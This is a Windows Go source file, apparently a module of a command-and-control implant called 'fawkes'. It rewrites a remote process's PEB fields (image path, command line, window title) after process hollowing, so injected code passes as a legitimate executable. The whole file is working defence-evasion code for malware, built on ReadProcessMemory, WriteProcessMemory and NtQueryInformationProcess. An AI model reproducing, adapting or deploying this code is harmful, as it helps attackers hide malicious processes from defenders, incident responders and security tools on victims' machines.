//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"

	"fawkes/pkg/structs"
)

// PEB offsets are in peb_offsets.go (cross-platform constants).

// pebParams holds the parameters for PEB manipulation
type pebParams struct {
	ProcessHandle  syscall.Handle
	ImagePath      string // New ImagePathName (empty = don't change)
	CommandLine    string // New CommandLine (empty = don't change)
	WindowTitle    string // New WindowTitle (empty = don't change)
}

// pebManipulate modifies PEB fields of a process to mask hollowing artifacts.
// The target process should already be in a suspended/hollowed state.
func pebManipulate(params pebParams) error {
	// Step 1: Read the PEB base address from the process
	var pbi processBasicInformation
	ntStatus := ntQueryInformationProcess(
		params.ProcessHandle,
		0, // ProcessBasicInformation
		unsafe.Pointer(&pbi),
		uint32(unsafe.Sizeof(pbi)),
		nil,
	)
	if ntStatus != 0 {
		return fmt.Errorf("NtQueryInformationProcess failed: 0x%X", ntStatus)
	}

	pebBase := pbi.PebBaseAddress

	// Step 2: Read ProcessParameters pointer from PEB
	var processParamsPtr uintptr
	err := readProcessMemory(params.ProcessHandle, pebBase+pebProcessParametersOffset,
		unsafe.Pointer(&processParamsPtr), unsafe.Sizeof(processParamsPtr))
	if err != nil {
		return fmt.Errorf("read ProcessParameters ptr: %w", err)
	}

	// Step 3: Overwrite the specified UNICODE_STRING fields
	if params.ImagePath != "" {
		if err := writeUnicodeString(params.ProcessHandle, processParamsPtr+uppImagePathNameOffset, params.ImagePath); err != nil {
			return fmt.Errorf("write ImagePathName: %w", err)
		}
	}

	if params.CommandLine != "" {
		if err := writeUnicodeString(params.ProcessHandle, processParamsPtr+uppCommandLineOffset, params.CommandLine); err != nil {
			return fmt.Errorf("write CommandLine: %w", err)
		}
	}

	if params.WindowTitle != "" {
		if err := writeUnicodeString(params.ProcessHandle, processParamsPtr+uppWindowTitleOffset, params.WindowTitle); err != nil {
			return fmt.Errorf("write WindowTitle: %w", err)
		}
	}

	return nil
}

// writeUnicodeString overwrites a UNICODE_STRING field in a remote process.
// It writes the new UTF-16LE string data in-place over the existing buffer
// and updates the Length field.
func writeUnicodeString(hProcess syscall.Handle, usAddr uintptr, value string) error {
	// Read the current UNICODE_STRING to get the buffer pointer
	var usData [unicodeStringSize]byte
	if err := readProcessMemory(hProcess, usAddr, unsafe.Pointer(&usData[0]), uintptr(unicodeStringSize)); err != nil {
		return fmt.Errorf("read UNICODE_STRING: %w", err)
	}

	// Parse the UNICODE_STRING: Length (2), MaxLength (2), pad (4), Buffer (8)
	maxLength := binary.LittleEndian.Uint16(usData[2:4])
	bufferPtr := *(*uintptr)(unsafe.Pointer(&usData[8]))

	// Convert the new value to UTF-16LE
	utf16Str := utf16.Encode([]rune(value))
	utf16Bytes := make([]byte, len(utf16Str)*2)
	for i, r := range utf16Str {
		binary.LittleEndian.PutUint16(utf16Bytes[i*2:], r)
	}

	// Check if the new string fits in the existing buffer
	newLen := uint16(len(utf16Bytes))
	if newLen > maxLength {
		return fmt.Errorf("new string (%d bytes) exceeds MaximumLength (%d)", newLen, maxLength)
	}

	// Write the new UTF-16 data to the buffer
	if err := writeProcessMemory(hProcess, bufferPtr, unsafe.Pointer(&utf16Bytes[0]), uintptr(len(utf16Bytes))); err != nil {
		return fmt.Errorf("write buffer: %w", err)
	}

	// Null-terminate if there's room
	if int(newLen)+2 <= int(maxLength) {
		var nullTerm [2]byte
		writeProcessMemory(hProcess, bufferPtr+uintptr(newLen), unsafe.Pointer(&nullTerm[0]), 2)
	}

	// Update the Length field (bytes, not including null terminator)
	binary.LittleEndian.PutUint16(usData[0:2], newLen)
	if err := writeProcessMemory(hProcess, usAddr, unsafe.Pointer(&usData[0]), 2); err != nil {
		return fmt.Errorf("update Length: %w", err)
	}

	return nil
}

// processBasicInformation for NtQueryInformationProcess
type processBasicInformation struct {
	ExitStatus                   uintptr
	PebBaseAddress               uintptr
	AffinityMask                 uintptr
	BasePriority                 int32
	_                            [4]byte // padding
	UniqueProcessId              uintptr
	InheritedFromUniqueProcessId uintptr
}

// readProcessMemory reads memory from a remote process
func readProcessMemory(hProcess syscall.Handle, addr uintptr, buffer unsafe.Pointer, size uintptr) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	readProc := kernel32.NewProc("ReadProcessMemory")
	ret, _, err := readProc.Call(
		uintptr(hProcess),
		addr,
		uintptr(buffer),
		size,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("ReadProcessMemory: %v", err)
	}
	return nil
}

// writeProcessMemory writes memory to a remote process
func writeProcessMemory(hProcess syscall.Handle, addr uintptr, buffer unsafe.Pointer, size uintptr) error {
	kernel32 := syscall.NewLazyDLL("kernel32.dll")
	writeProc := kernel32.NewProc("WriteProcessMemory")
	ret, _, err := writeProc.Call(
		uintptr(hProcess),
		addr,
		uintptr(buffer),
		size,
		0,
	)
	if ret == 0 {
		return fmt.Errorf("WriteProcessMemory: %v", err)
	}
	return nil
}

// ntQueryInformationProcess calls NtQueryInformationProcess
func ntQueryInformationProcess(hProcess syscall.Handle, infoClass uint32, info unsafe.Pointer, infoLen uint32, retLen *uint32) uint32 {
	ntdll := syscall.NewLazyDLL("ntdll.dll")
	proc := ntdll.NewProc("NtQueryInformationProcess")
	ret, _, _ := proc.Call(
		uintptr(hProcess),
		uintptr(infoClass),
		uintptr(info),
		uintptr(infoLen),
		uintptr(unsafe.Pointer(retLen)),
	)
	return uint32(ret)
}

// pebDecorate integrates PEB manipulation into the hollow command's Execute flow.
// Called after process hollowing succeeds but before resuming the thread.
func pebDecorate(task structs.Task, hProcess syscall.Handle, params hollowParams) string {
	peb := pebParams{
		ProcessHandle: hProcess,
		ImagePath:     params.Target, // Set to the legitimate target exe
	}

	// Build a plausible command line from the target
	if params.Target != "" {
		peb.CommandLine = fmt.Sprintf("\"%s\"", params.Target)
		// Extract just the executable name for window title
		parts := strings.Split(params.Target, `\`)
		peb.WindowTitle = parts[len(parts)-1]
	}

	if err := pebManipulate(peb); err != nil {
		return fmt.Sprintf(" (PEB decoration failed: %v)", err)
	}
	return " (PEB decorated: ImagePath, CommandLine, WindowTitle updated)"
}
